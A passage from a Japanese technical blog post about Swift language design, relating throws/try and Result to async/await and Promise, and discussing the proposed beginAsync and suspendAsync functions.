<span id="throwstry-と-result" class="fragment"></span><a href="#throwstry-%E3%81%A8-result"><i class="fa fa-link"></i></a><code>throws/try</code> と <code>Result</code>
</h3>

<p>先程、関数に <code>throws</code> を付与するのと <code>Result</code> を <code>return</code> するのは同じだと言いました。</p>

<p><code>flatMap</code> にも対応するものがあります。 <code>throws/try</code> と <code>Result</code> で同じ処理が書かれた次のコードを見比べてみて下さい。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// throws/try</span>
<span class="kd">let</span> <span class="nv">json</span><span class="p">:</span> <span class="n">Data</span> <span class="p">=</span> <span class="k">try</span> <span class="n">loadData</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">path</span><span class="p">)</span>
<span class="kd">let</span> <span class="nv">user</span><span class="p">:</span> <span class="n">User</span> <span class="p">=</span> <span class="k">try</span> <span class="n">decodeUser</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">json</span><span class="p">)</span>
<span class="c1">// `user` を使う処理</span>

<span class="c1">// Result</span>
<span class="n">loadData</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">path</span><span class="p">).</span><span class="n">flatMap</span> <span class="p">{</span> <span class="p">(</span><span class="n">json</span><span class="p">:</span> <span class="n">Data</span><span class="p">)</span> <span class="k">in</span>
  <span class="n">decodeUser</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">json</span><span class="p">)</span>
<span class="p">}.</span><span class="n">flatMap</span> <span class="p">{</span> <span class="p">(</span><span class="n">user</span><span class="p">:</span> <span class="n">User</span><span class="p">)</span> <span class="k">in</span>
  <span class="c1">// `user` を使う処理</span>
<span class="p">}</span>
</pre></div></div>

<p>どちらのコードも <code>loadData</code> と <code>decodeUser</code> に成功した場合だけ <code>user</code> が得られ、失敗した場合にはその <code>Error</code> が得られます。一番重要なのは、 <code>flatMap</code> でモナドの中身を取り出して処理しているのと同じように、 <code>try</code> もエラーの場合を剥がして中身を取り出す処理になっていることです。 <strong><code>try</code> して代入するのは本質的に <code>flatMap</code> と同じことなのです。</strong></p>

<h3>
<span id="小まとめ" class="fragment"></span><a href="#%E5%B0%8F%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>小まとめ</h3>

<ul>
<li>
<code>throws</code> を付与 == <code>Result</code> を <code>return</code>
</li>
<li>
<code>try</code> して代入 == <code>flatMap</code>
</li>
</ul>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// throws/try</span>
<span class="kd">func</span> <span class="nf">loadUser</span><span class="p">(</span><span class="n">from</span> <span class="n">path</span><span class="p">:</span> <span class="nb">String</span><span class="p">)</span> <span class="kr">throws</span> <span class="p">-&gt;</span> <span class="n">User</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nv">json</span><span class="p">:</span> <span class="n">Data</span> <span class="p">=</span> <span class="k">try</span> <span class="n">loadData</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">path</span><span class="p">)</span>
  <span class="k">return</span> <span class="k">try</span> <span class="n">decodeUser</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">json</span><span class="p">)</span>
<span class="p">}</span>

<span class="c1">// Result</span>
<span class="kd">func</span> <span class="nf">loadUser</span><span class="p">(</span><span class="n">from</span> <span class="n">path</span><span class="p">:</span> <span class="nb">String</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="n">Result</span><span class="p">&lt;</span><span class="n">User</span><span class="p">&gt;</span> <span class="p">{</span>
  <span class="k">return</span> <span class="n">loadData</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">path</span><span class="p">).</span><span class="n">flatMap</span> <span class="p">{</span> <span class="p">(</span><span class="n">json</span><span class="p">:</span> <span class="n">Data</span><span class="p">)</span> <span class="k">in</span>
    <span class="n">decodeUser</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">json</span><span class="p">)</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<h2>
<span id="result--throwstry--promise--" class="fragment"></span><a href="#result--throwstry--promise--"><i class="fa fa-link"></i></a><code>Result</code> : <code>throws/try</code> = <code>Promise</code> : ?</h2>

<p>さらに時は進んで 2016 年の 1 月、僕は <code>Result</code> やエラー処理をテーマに <a href="https://www.tryswift.co/" rel="nofollow noopener" target="_blank">try! Swift</a> の発表の準備をしていました。</p>

<p><code>Result</code> は <code>throws/try</code> と違って非同期処理と一緒に使いやすいです。一方で <code>flatMap</code> をチェーンするコードより <code>try</code> して代入を繰り返すコードの方がわかりやすいです。両者のいいとこどりができたら最高です。なので、 <code>throws -&gt; Foo</code> を <code>Result&lt;Foo&gt;</code> を <code>return</code> することのシンタックスシュガーにして、二つの世界を自由に行き来できるようにすればいいんじゃないかと考えました。</p>

<p>たとえば、↓のような感じです。これなら、普段は <code>throws/try</code> で使っておいて、非同期処理などで必要なときだけ <code>Result</code> として扱えます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">func</span> <span class="nf">loadFoo</span><span class="p">()</span> <span class="kr">throws</span> <span class="p">-&gt;</span> <span class="n">Foo</span> <span class="p">{</span> <span class="c1">// `-&gt; Result&lt;Foo&gt;` でも同じ</span>
  <span class="p">...</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nv">foo1</span><span class="p">:</span> <span class="n">Foo</span> <span class="p">=</span> <span class="k">try</span> <span class="n">loadFoo</span><span class="p">()</span>     <span class="c1">// `try` すると `Foo` が得られる</span>
<span class="kd">let</span> <span class="nv">foo2</span><span class="p">:</span> <span class="n">Result</span><span class="p">&lt;</span><span class="n">Foo</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">loadFoo</span><span class="p">()</span> <span class="c1">// `try` しないと `Result&lt;Foo&gt;` が得られる</span>
</pre></div></div>

<p>このような話を発表しようと考えているときに、ふと <code>Result</code> に対して <code>throws/try</code> が考えられるなら、 <code>Promise</code> に対しても同じようなものが考えられないかと思いました。なにせ、 <code>Result</code> も <code>Promise</code> も同じモナドです。 <code>try</code> して代入することが <code>flatMap</code> に相当するなら、同じことが <code>Promise</code> に大してもできるはずです。</p>

<p>そう考えると、 C# の <code>async/await</code> が（少し変更は必要ですが）ぴたりとそれに当てはまることに気付きました。 C# の <code>async</code> は次のように <code>async</code> を付けた上で <code>Promise</code> （ C# では <code>Task</code> ）を返します。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// C# の `async` を Swift っぽい構文で書くと</span>
<span class="kd">func</span> <span class="nf">download</span><span class="p">(</span><span class="n">from</span> <span class="n">url</span><span class="p">:</span> <span class="n">URL</span><span class="p">)</span> <span class="n">async</span> <span class="p">-&gt;</span> <span class="n">Promise</span><span class="p">&lt;</span><span class="n">Data</span><span class="p">&gt;</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
</pre></div></div>

<p><code>async</code> を書いた上で <code>Promise</code> を返すのは冗長なので、↓のような構文にすると <code>Promise</code> : <code>async</code> = <code>Result</code> : <code>throws</code> でぴたりとハマります。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// Swift にフィットするように構文を変更</span>
<span class="kd">func</span> <span class="nf">download</span><span class="p">(</span><span class="n">from</span> <span class="n">url</span><span class="p">:</span> <span class="n">URL</span><span class="p">)</span> <span class="n">async</span> <span class="p">-&gt;</span> <span class="n">Data</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
</pre></div></div>

<p>つまり、↓の二つを同じ意味にしてしまうわけです。 <code>throws</code> と <code>Result</code> の関係とまったく同じです。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// async</span>
<span class="kd">func</span> <span class="nf">download</span><span class="p">(</span><span class="n">from</span> <span class="n">url</span><span class="p">:</span> <span class="n">URL</span><span class="p">)</span> <span class="n">async</span> <span class="p">-&gt;</span> <span class="n">Data</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>

<span class="c1">// Promise</span>
<span class="kd">func</span> <span class="nf">download</span><span class="p">(</span><span class="n">from</span> <span class="n">url</span><span class="p">:</span> <span class="n">URL</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="n">Promise</span><span class="p">&lt;</span><span class="n">Data</span><span class="p">&gt;</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
</pre></div></div>

<p><code>throws</code> と <code>async</code> が対応するなら <code>try</code> に対応するものも必要です。これも <code>await</code> と考えればぴったりです。 <code>throws/try</code> と <code>Result</code> のときとまったく同じです。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// async/await</span>
<span class="kd">let</span> <span class="nv">data</span><span class="p">:</span> <span class="n">Data</span> <span class="p">=</span> <span class="n">await</span> <span class="n">download</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span>
<span class="c1">// `data` を使う処理</span>

<span class="c1">// Promise</span>
<span class="n">download</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">).</span><span class="n">flatMap</span> <span class="p">{</span> <span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="n">Data</span><span class="p">)</span> <span class="k">in</span>
  <span class="c1">// `data` を使う処理</span>
<span class="p">}</span>
</pre></div></div>

<p><strong>このような <code>async/await</code> を考えると <code>throws</code> : <code>try</code> : <code>Result</code> = <code>async</code> : <code>await</code> : <code>Promise</code> という関係が成り立ちます。なんて美しい関係でしょう。</strong></p>

<h2>
<span id="非同期エラー処理" class="fragment"></span><a href="#%E9%9D%9E%E5%90%8C%E6%9C%9F%E3%82%A8%E3%83%A9%E3%83%BC%E5%87%A6%E7%90%86"><i class="fa fa-link"></i></a>非同期エラー処理</h2>

<p><code>Promise</code> と <code>Result</code> が組み合わせられるように、 <code>throws/try</code> と <code>async/await</code> も組み合わせられます。非同期かつ失敗し得る <code>download</code> 関数は次のように書けます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// async/await + throws/try</span>
<span class="kd">func</span> <span class="nf">download</span><span class="p">(</span><span class="n">from</span> <span class="n">url</span><span class="p">:</span> <span class="n">URL</span><span class="p">)</span> <span class="n">async</span> <span class="kr">throws</span> <span class="p">-&gt;</span> <span class="n">Data</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>

<span class="c1">// Promise + Result</span>
<span class="kd">func</span> <span class="nf">download</span><span class="p">(</span><span class="n">from</span> <span class="n">url</span><span class="p">:</span> <span class="n">URL</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="n">Promise</span><span class="p">&lt;</span><span class="n">Result</span><span class="p">&lt;</span><span class="n">Data</span><span class="p">&gt;</span><span class="o">&gt;</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
</pre></div></div>

<p>これらを使うときのコードは↓です。一つ目の <code>flatMap</code> が <code>await</code> に、二つ目の <code>flatMap</code> が <code>try</code> に対応しています。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// async/await + throws/try</span>
<span class="kd">let</span> <span class="nv">data</span><span class="p">:</span> <span class="n">Data</span> <span class="p">=</span> <span class="k">try</span> <span class="n">await</span> <span class="n">download</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span>
<span class="c1">// `data` を使う処理</span>

<span class="c1">// Promise + Result</span>
<span class="n">download</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">).</span><span class="n">flatMap</span> <span class="p">{</span> <span class="nv">$0</span><span class="p">.</span><span class="n">flatMap</span> <span class="p">{</span> <span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="n">Data</span><span class="p">)</span> <span class="k">in</span>
  <span class="c1">// `data` を使う処理</span>
<span class="p">}</span> <span class="p">}</span>
</pre></div></div>

<h2>
<span id="モナド地獄" class="fragment"></span><a href="#%E3%83%A2%E3%83%8A%E3%83%89%E5%9C%B0%E7%8D%84"><i class="fa fa-link"></i></a>モナド地獄</h2>

<p>そんなわけで僕は <code>throws</code> は <code>Result</code> を、 <code>async</code> は <code>Promise</code> を返すことのシュガーにしたらいいんじゃないかということを <a href="https://academy.realm.io/posts/tryswift-yuta-koshizawa-error-handling-swift/" rel="nofollow noopener" target="_blank">try! Swift で話しました</a>。このときに Ray Fix さんに興味を持っていただき「もし Proposal を出すなら英文チェックするよ。」と申し出て下さったことから、冒頭に書いたネイティブチェックにつながりました。</p>

<p>try! Swift が終わって、 <code>throws</code> を <code>Result</code> のシュガーにする部分だけを切り出して <a href="https://github.com/apple/swift-evolution" rel="nofollow noopener" target="_blank">swift-evolution</a> に投げたところ、 Core Team の Joe Groff から<a href="https://lists.swift.org/pipermail/swift-evolution/Week-of-Mon-20160314/012545.html" rel="nofollow noopener" target="_blank">こちらのコメント</a>をもらいました。以下、僕の解釈で説明します。</p>

<p>たとえば、 <code>Array&lt;Data&gt;</code> があったとして、これをすべてデコードして <code>Array&lt;User&gt;</code> に変更したいとします。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nv">jsons</span><span class="p">:</span> <span class="nb">Array</span><span class="p">&lt;</span><span class="n">Data</span><span class="p">&gt;</span> <span class="p">=</span> <span class="p">...</span>
<span class="kd">let</span> <span class="nv">users</span><span class="p">:</span> <span class="nb">Array</span><span class="p">&lt;</span><span class="n">Result</span><span class="p">&lt;</span><span class="n">Data</span><span class="p">&gt;</span><span class="o">&gt;</span> <span class="p">=</span> <span class="n">jsons</span><span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="n">decodeUser</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="nv">$0</span><span class="p">)</span> <span class="p">}</span>
</pre></div></div>

<p>しかし、得られたのは <code>Array&lt;Result&lt;User&gt;&gt;</code> です。一つでも失敗したらエラーとしたい場合ほしいのは <code>Result&lt;Array&lt;User&gt;&gt;</code> です。　Haskell などの言語では、 <code>Array&lt;Result&lt;User&gt;&gt;</code> を <code>Result&lt;Array&lt;User&gt;&gt;</code> に変換するための <code>sequence</code> という関数が用意されていたりします。この他にも <code>Result&lt;Promise&lt;Result&lt;T&gt;&gt;</code> → <code>Promise&lt;Result&lt;T&gt;&gt;</code> 、 <code>Array&lt;Result&lt;Promise&lt;T&gt;&gt;</code> → <code>Promise&lt;Result&lt;Array&lt;T&gt;&gt;</code> なんかもやりたくなりそうです。</p>

<p>極端な話、次のようなことをやろうとしたら、モナド的には戻り値の型は <code>Result&lt;Promise&lt;Result&lt;Promise&lt;Result&lt;Foo&gt;&gt;&gt;&gt;&gt;</code> です。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nv">a</span> <span class="p">=</span> <span class="k">try</span> <span class="p">...</span>
<span class="kd">let</span> <span class="nv">b</span> <span class="p">=</span> <span class="n">await</span> <span class="p">...</span>
<span class="kd">let</span> <span class="nv">c</span> <span class="p">=</span> <span class="k">try</span> <span class="p">...</span>
<span class="kd">let</span> <span class="nv">d</span> <span class="p">=</span> <span class="n">await</span> <span class="p">...</span>
<span class="kd">let</span> <span class="nv">e</span> <span class="p">=</span> <span class="k">try</span> <span class="p">...</span>
<span class="k">return</span> <span class="n">Foo</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</pre></div></div>

<p>でも、 99% のケースでは本当にほしいのは <code>Promise&lt;Result&lt;Foo&gt;&gt;</code> のはずです。このモナドパズルを解かないといけないのは <strong>モナド地獄</strong> です。</p>

<p><code>async/await</code> と <code>throws/try</code> であれば <code>async throws -&gt; Foo</code> とすれば良いだけです。入れ子のパズルに苦しめられることもありません。これの意味するところは、 <strong><code>throws/try</code> や <code>async/await</code> はモナドパズルの解き方を定めていて、それが自動で適用される</strong> ということです。</p>

<p>この話に関連して面白いのが <code>rethrows</code> です。 <code>map</code> して <code>Result</code> を返した場合は結果は <code>Array&lt;Result&lt;User&gt;&gt;</code> となりますが、エラーを <code>throw</code> すると <code>map</code> 自体がエラーを <code>throw</code> します。言い換えると、 <code>Result&lt;Array&lt;User&gt;&gt;</code> 相当のところまで変換してくれているということです。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// throws/try</span>
<span class="kd">let</span> <span class="nv">users</span><span class="p">:</span> <span class="nb">Array</span><span class="p">&lt;</span><span class="n">User</span><span class="p">&gt;</span> <span class="p">=</span> <span class="k">try</span> <span class="n">jsons</span><span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="k">try</span> <span class="n">decode</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="nv">$0</span><span class="p">)</span> <span class="p">}</span> <span class="c1">// `Result&lt;Array&lt;User&gt;&gt;` 相当</span>

<span class="c1">// Result</span>
<span class="kd">let</span> <span class="nv">users</span><span class="p">:</span> <span class="nb">Array</span><span class="p">&lt;</span><span class="n">Resut</span><span class="p">&lt;</span><span class="n">User</span><span class="p">&gt;</span><span class="o">&gt;</span> <span class="p">=</span> <span class="n">jsons</span><span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="n">decode</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="nv">$0</span><span class="p">)</span> <span class="p">}</span>
</pre></div></div>

<p><code>Array&lt;Result&lt;T&gt;&gt;</code> がほしいことは滅多にないので、 <code>rethrows</code> が勝手にモナドのネスト順序を入れ替えて <code>Result&lt;Array&lt;T&gt;&gt;</code> 相当まで変換してくれているということです。</p>

<h2>
<span id="promise-のない-asyncawait" class="fragment"></span><a href="#promise-%E3%81%AE%E3%81%AA%E3%81%84-asyncawait"><i class="fa fa-link"></i></a><code>Promise</code> のない <code>async/await</code>
</h2>

<p>Swift が <code>Result</code> を採用しない道を進むなら、 <code>async/await</code> にも <code>Promise</code> がない方が良いように思います。</p>

<p>C# や JavaScript の <code>async/await</code> は <code>Promise</code> （ C# では <code>Task</code> ）の上に構築されているので、 <code>Promise</code> のない <code>async/await</code> は挑戦的です。しかし、 <code>throws/try</code> が <code>Result</code> なしで実現できているのだから <code>async/await</code> にもできそうなものです。</p>

<p>そんなことを <a href="https://gist.github.com/koher/5cd16adac7a62b6d3eb0b910ccc13534" rel="nofollow noopener" target="_blank">SwiftJP Slack などで話してた</a> んですが、 swift-evolution で非同期処理の話が始まらないので提案せずに放置していました。しかし、今年の GW 頃にやっぱり Swift に <code>async/await</code> を導入するならこれしかない！と思い立ってまとめたのが冒頭で挙げた<a href="https://gist.github.com/koher/3e04b4f1b8adbbf0379d38c0ad83a3ea" rel="nofollow noopener" target="_blank">こちら</a>です。</p>

<h3>
<span id="beginasync-と-suspendasync" class="fragment"></span><a href="#beginasync-%E3%81%A8-suspendasync"><i class="fa fa-link"></i></a><code>beginAsync</code> と <code>suspendAsync</code>
</h3>

<p>単に <code>Promise</code> を返す代わりに <code>async</code> と書き、 <code>flatMap</code> の代わりに <code>await</code> するのではいけません。 <code>async/await</code> から <code>Promise</code> を取り除くに当たっては、 <code>Promise</code> の <code>get</code> と <code>init</code> に相当するものも提供しなければなりません。それが <code>beginAsync</code> と <code>suspendAsync</code> です（僕の提案中では <code>nonblock</code> と <code>asyncronize</code> です。さすがに名称は異なってますが、同じ道具が必要になってるのがおもしろいです）。</p>

<p><code>beginAsync</code> と <code>suspendAsync</code> のシグネチャは↓です。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">func</span> <span class="nf">beginAsync</span><span class="p">(</span><span class="kc">_</span> <span class="n">body</span><span class="p">:</span> <span class="p">()</span> <span class="n">async</span> <span class="kr">throws</span> <span class="p">-&gt;</span> <span class="nb">Void</span><span class="p">)</span> <span class="kr">rethrows</span> <span class="p">-&gt;</span> <span class="nb">Void</span>

<span class="kd">func</span> <span class="nf">suspendAsync</span><span class="p">&lt;</span><span class="n">T</span><span class="p">&gt;(</span>
  <span class="kc">_</span> <span class="n">body</span><span class="p">:</span> <span class="p">(</span><span class="kc">_</span> <span class="n">continuation</span><span class="p">:</span> <span class="p">@</span><span class="n">escaping</span> <span class="p">(</span><span class="n">T</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="p">())</span> <span class="p">-&gt;</span> <span class="p">()</span>
<span class="p">)</span> <span class="n">async</span> <span class="p">-&gt;</span> <span class="n">T</span>

<span class="kd">func</span> <span class="nf">suspendAsync</span><span class="p">&lt;</span><span class="n">T</span><span class="p">&gt;(</span>
  <span class="kc">_</span> <span class="n">body</span><span class="p">:</span> <span class="p">(</span><span class="kc">_</span> <span class="n">continuation</span><span class="p">:</span> <span class="p">@</span><span class="n">escaping</span> <span class="p">(</span><span class="n">T</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="p">(),</span>
           <span class="kc">_</span> <span class="n">error</span><span class="p">:</span> <span class="p">@</span><span class="n">escaping</span> <span class="p">(</span><span class="n">Error</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="p">())</span> <span class="p">-&gt;</span> <span class="p">()</span>
<span class="p">)</span> <span class="n">async</span> <span class="kr">throws</span> <span class="p">-&gt;</span> <span class="n">T</span>
</pre></div></div>

<p><code>Promise</code> では <code>get</code> を使って非同期的に値を受け取れました。 <code>beginAsync</code> を使えばこれと似たようなことができます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// Promise</span>
<span class="n">download</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">).</span><span class="kr">get</span> <span class="p">{</span> <span class="n">data</span> <span class="k">in</span>
  <span class="c1">// `data` を使う処理</span>
<span class="p">}</span>

<span class="c1">// async/await</span>
<span class="n">beginAsync</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nv">data</span> <span class="p">=</span> <span class="n">await</span> <span class="n">download</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span>
  <span class="c1">// `data` を使う処理</span>
<span class="p">}</span>
</pre></div></div>

<p>また、 <code>Promise</code> のイニシャライザを使ってコールバックで値を受け取る API を <code>Promise</code> 化できました。これも <code>suspendAsync</code> で似たことができます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// Promise</span>
<span class="n">Promise</span><span class="p">&lt;</span><span class="n">Data</span><span class="p">&gt;</span> <span class="p">{</span> <span class="n">fulfill</span> <span class="k">in</span>
  <span class="n">download</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span> <span class="p">{</span> <span class="n">data</span> <span class="k">in</span>
    <span class="n">fulfill</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// async/await</span>
<span class="n">await</span> <span class="n">suspendAsync</span> <span class="p">{</span> <span class="n">fulfill</span> <span class="k">in</span>
  <span class="n">await</span> <span class="n">download</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span> <span class="p">{</span> <span class="n">data</span> <span class="k">in</span><span class="p">}</span>
    <span class="n">fulfill</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>こうして、 <code>Promise</code> がなくても <code>async/await</code> を実現することができました。</p>

<p>やや余談ですが、 Proposal の中では <code>beginAsync</code> の <code>body</code> に <code>throws</code> が付けられており、 <code>beginAsync</code> 自体も <code>rethrows</code> になっています。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">func</span> <span class="nf">beginAsync</span><span class="p">(</span><span class="kc">_</span> <span class="n">body</span><span class="p">:</span> <span class="p">()</span> <span class="n">async</span> <span class="kr">throws</span> <span class="p">-&gt;</span> <span class="nb">Void</span><span class="p">)</span> <span class="kr">rethrows</span> <span class="p">-&gt;</span> <span class="nb">Void</span>
</pre></div></div>

<p>僕はこの <code>throws</code> と <code>rethrows</code> には反対です。 <code>beginAsync</code> に渡された <code>body</code> は非同期処理を行うので、即座にエラーを <code>throw</code> することができません。 <code>beginAsync</code> がエラーを <code>rethrow</code> できるのは、 <code>body</code> の中の最初の <code>await</code> までにエラーが <code>throw</code> された場合だけです。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="k">do</span> <span class="p">{</span>
  <span class="k">try</span> <span class="n">beginAsync</span> <span class="p">{</span>
    <span class="k">try</span> <span class="n">foo</span><span class="p">()</span> <span class="c1">// ここで発生したエラーを・・・</span>
    <span class="n">await</span> <span class="n">bar</span><span class="p">()</span>
  <span class="p">}</span>
<span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="c1">// ここで `catch`</span>
  <span class="c1">// エラー処理</span>
<span class="p">}</span>
</pre></div></div>

<p>非同期的に発生したエラーは <code>catch</code> できないので、エラーが <code>throw</code> されたらクラッシュするしかありません。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="k">do</span> <span class="p">{</span>
  <span class="k">try</span> <span class="n">beginAsync</span> <span class="p">{</span>
    <span class="n">await</span> <span class="n">bar</span><span class="p">()</span>
    <span class="k">try</span> <span class="n">foo</span><span class="p">()</span> <span class="c1">// ここでエラーが発生しても・・・</span>
  <span class="p">}</span>
<span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="c1">// ここで `catch` できないのでクラッシュ！</span>
  <span class="c1">// エラー処理</span>
<span class="p">}</span>
</pre></div></div>

<p>最初の <code>await</code> の前に <code>try</code> したい場合は、それを <code>beginAsync</code> の外に出せるはずです。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="k">do</span> <span class="p">{</span>
  <span class="k">try</span> <span class="n">foo</span><span class="p">()</span> <span class="c1">// `beginAsync` の外に出す</span>
  <span class="n">beginAsync</span> <span class="p">{</span>
    <span class="n">await</span> <span class="n">bar</span><span class="p">()</span>
  <span class="p">}</span>
<span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
  <span class="c1">// エラー処理</span>
<span class="p">}</span>
</pre></div></div>

<p>もし <code>beginAsync</code> の <code>body</code> に <code>throws</code> が付いてなければ、 <code>body</code> の中でエラー処理が強制されるので、 <code>await</code> してから <code>try</code> のようなケースも安全に対処できます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="n">beginAsync</span> <span class="p">{</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="n">await</span> <span class="n">bar</span><span class="p">()</span>
    <span class="k">try</span> <span class="n">foo</span><span class="p">()</span>
  <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="c1">// これがないとコンパイルエラー</span>
    <span class="c1">// エラー処理</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>せっかくコンパイル時にチェック可能なエラー処理機構を持っているのに、 <code>beginAsync</code> に渡すクロージャの中ではそれが台無しになってしまいます。</p>

<p>この点については一度 swift-evolution に書いたのですがうまく伝わってなさそうなので、今度もう一度投稿したいと考えています。</p>

<h3>
<span id="小まとめ-1" class="fragment"></span><a href="#%E5%B0%8F%E3%81%BE%E3%81%A8%E3%82%81-1"><i class="fa fa-link"></i></a>小まとめ</h3>

<p>長々と書いてきましたが、 Proposal の中には出てこない <code>Promise</code> モナドを考えて、 <code>Result</code> や <code>throws/try</code> との関係を考えると、 Swift にフィットする <code>async/await</code> はこれしかないという気持ちになります。</p>

<p>その根拠は関係が「美しい」ことだけかもしれませんが、僕は経験則的に美しさは重要であると考えています。 <strong>関係や構造が美しく整理できるときは物事の本質を突いていることが多いです。</strong></p>

<p>逆にそれを外すと、後で思いもよらないところで問題が発生して困ったりします。</p>

<p>たとえば、今回の <code>async/await</code> の Proposal にも、非同期処理はほぼ確実にエラーを伴うんだから <code>async</code> と <code>await</code> だけ書けば <code>throws</code> と <code>try</code> も付いていることにしてはどうかという意見もあります。しかし、この一見筋が通ったように見える意見には問題があります。たとえば、後で紹介する Generator を <code>async/await</code> で実現しようとすると <code>throws/try</code> であってほしくありません。</p>

<p>人はすべてを見通せるわけではないので一見問題がなさそうに見えても何かを見逃している可能性があります。できるだけ「美しい」方を選択することで、将来的なトラブルの可能性を低減できるんじゃないでしょうか。</p>

<h2>
<span id="throws--try----async--await--" class="fragment"></span><a href="#throws--try----async--await--"><i class="fa fa-link"></i></a><code>throws</code> : <code>try</code> : △ = <code>async</code> : <code>await</code> : □</h2>

<p><code>throws/try</code> と <code>async/await</code> の関係を考えると Proposal に書かれていないいくつかの興味深いことが見えてきます。</p>

<h3>
<span id="throws--try--catch--async--await--" class="fragment"></span><a href="#throws--try--catch--async--await--"><i class="fa fa-link"></i></a><code>throws</code> : <code>try</code> : <code>catch</code> = <code>async</code> : <code>await</code> : ?</h3>

<p><code>throws/try</code> の <code>do/catch</code> に対応するものを <code>async/await</code> にも考えるとどうなるでしょうか。 <code>do/catch</code> しない場合、 <code>try</code> を含む関数は必ず <code>throws</code> でなければなりません。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// do/catch なし</span>
<span class="kd">func</span> <span class="nf">foo</span><span class="p">()</span> <span class="kr">throws</span> <span class="p">-&gt;</span> <span class="n">Bar</span> <span class="p">{</span> <span class="c1">// `throws` 必須</span>
  <span class="k">return</span> <span class="k">try</span> <span class="n">bar</span><span class="p">()</span>
<span class="p">}</span>

<span class="c1">// do/catch あり</span>
<span class="kd">func</span> <span class="nf">foo</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="n">Bar</span> <span class="p">{</span> <span class="c1">// `throws` でなくて良い</span>
